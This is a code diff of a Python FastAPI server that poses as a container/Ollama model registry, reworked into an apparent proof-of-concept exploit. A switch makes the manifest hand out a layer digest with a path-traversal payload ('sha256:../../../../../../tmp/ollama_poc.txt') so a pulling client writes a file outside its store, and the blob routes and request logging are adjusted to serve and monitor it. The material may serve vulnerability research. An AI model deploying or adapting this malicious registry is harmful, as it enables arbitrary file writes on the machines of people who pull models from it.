@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
-"""registry：200 + Location 同时给"""
+"""registry：支持可切换的穿越 digest + 完整日志"""
 import hashlib
 import json
+import os
+
 from fastapi import FastAPI, Request, Response
 
 app = FastAPI()
@@ -19,33 +21,57 @@ H_CONFIG = hashlib.sha256(CONFIG_BLOB).hexdigest()
 BLOBS = {H_MODEL: MODEL_BLOB, H_CONFIG: CONFIG_BLOB}
 BASE = "https://regsvc.orkestr.run"
 
-MANIFEST = {
-    "schemaVersion": 2,
-    "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
-    "config": {
-        "mediaType": "application/vnd.docker.container.image.v1+json",
-        "digest": "sha256:" + H_CONFIG,
-        "size": len(CONFIG_BLOB),
-    },
-    "layers": [{
-        "mediaType": "application/vnd.ollama.image.model",
-        "digest": "sha256:" + H_MODEL,
-        "size": len(MODEL_BLOB),
-    }],
-}
+# 可切换的 layer digest：环境变量 MODE
+#   valid     -> 正常 hex
+#   traverse  -> 路径穿越
+MODE = os.environ.get("MODEL_DIGEST_MODE", "valid")
+if MODE == "traverse":
+    LAYER_DIGEST = "sha256:../../../../../../tmp/ollama_poc.txt"
+else:
+    LAYER_DIGEST = "sha256:" + H_MODEL
+
+
+def manifest_body():
+    return json.dumps({
+        "schemaVersion": 2,
+        "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
+        "config": {
+            "mediaType": "application/vnd.docker.container.image.v1+json",
+            "digest": "sha256:" + H_CONFIG,
+            "size": len(CONFIG_BLOB),
+        },
+        "layers": [{
+            "mediaType": "application/vnd.ollama.image.model",
+            "digest": LAYER_DIGEST,
+            "size": len(MODEL_BLOB),
+        }],
+    })
 
 
 @app.middleware("http")
 async def mw(request: Request, call_next):
-    LOGS.append({"m": request.method, "p": request.url.path[:120]})
-    if len(LOGS) > 300:
-        del LOGS[:80]
+    LOGS.append({"m": request.method, "p": request.url.path[:160],
+                 "ua": (request.headers.get("user-agent") or "")[:45]})
+    if len(LOGS) > 400:
+        del LOGS[:100]
     return await call_next(request)
 
 
 @app.get("/logs")
 def logs():
-    return {"n": len(LOGS), "logs": LOGS[-80:]}
+    return {"n": len(LOGS), "mode": MODE, "layer": LAYER_DIGEST,
+            "logs": LOGS[-100:]}
+
+
+@app.post("/logs/clear")
+def clear():
+    LOGS.clear()
+    return {"ok": True, "mode": MODE, "layer": LAYER_DIGEST}
+
+
+@app.get("/")
+def root():
+    return {"status": "ok", "mode": MODE, "layer": LAYER_DIGEST}
 
 
 @app.get("/v2/")
@@ -56,13 +82,10 @@ def v2():
 
 @app.api_route("/v2/{ns}/{repo}/manifests/{tag}", methods=["GET", "HEAD"])
 def manifest(ns: str, repo: str, tag: str, request: Request):
-    body = json.dumps(MANIFEST)
+    body = manifest_body()
     dg = "sha256:" + hashlib.sha256(body.encode()).hexdigest()
-    hdr = {
-        "Docker-Content-Digest": dg,
-        "Content-Length": str(len(body)),
-        "Location": BASE + "/v2/" + ns + "/" + repo + "/manifests/" + dg,
-    }
+    hdr = {"Docker-Content-Digest": dg, "Content-Length": str(len(body)),
+           "Location": BASE + "/v2/" + ns + "/" + repo + "/manifests/" + dg}
     if request.method == "HEAD":
         return Response(status_code=200,
                         media_type="application/vnd.docker.distribution.manifest.v2+json",
@@ -74,27 +97,24 @@ def manifest(ns: str, repo: str, tag: str, request: Request):
 
 @app.api_route("/v2/{ns}/{repo}/blobs/{digest:path}", methods=["GET", "HEAD"])
 def blob(ns: str, repo: str, digest: str, request: Request):
-    key = digest.replace("sha256:", "").split("/")[-1]
+    key = digest.replace("sha256:", "")
     data = BLOBS.get(key) or MODEL_BLOB
-    hdr = {
-        "Content-Length": str(len(data)),
-        "Location": BASE + "/content/" + key,
-        "Docker-Content-Digest": "sha256:" + key,
-        "Accept-Ranges": "bytes",
-    }
+    hdr = {"Content-Length": str(len(data)),
+           "Location": BASE + "/content/" + key.replace("/", "_"),
+           "Docker-Content-Digest": "sha256:" + key,
+           "Accept-Ranges": "bytes"}
     if request.method == "HEAD":
         return Response(status_code=200, headers=hdr)
     return Response(content=data, media_type="application/octet-stream", headers=hdr)
 
 
-@app.api_route("/content/{key}", methods=["GET", "HEAD"])
+@app.api_route("/content/{key:path}", methods=["GET", "HEAD"])
 def content(key: str, request: Request):
-    data = BLOBS.get(key) or MODEL_BLOB
-    hdr = {
-        "Content-Length": str(len(data)),
-        "Location": BASE + "/content/" + key,
-        "Accept-Ranges": "bytes",
-    }
+    k = key.replace("_", "/")
+    data = BLOBS.get(k) or MODEL_BLOB
+    hdr = {"Content-Length": str(len(data)),
+           "Location": BASE + "/content/" + key,
+           "Accept-Ranges": "bytes"}
     if request.method == "HEAD":
         return Response(status_code=200, headers=hdr)
     return Response(content=data, media_type="application/octet-stream", headers=hdr)
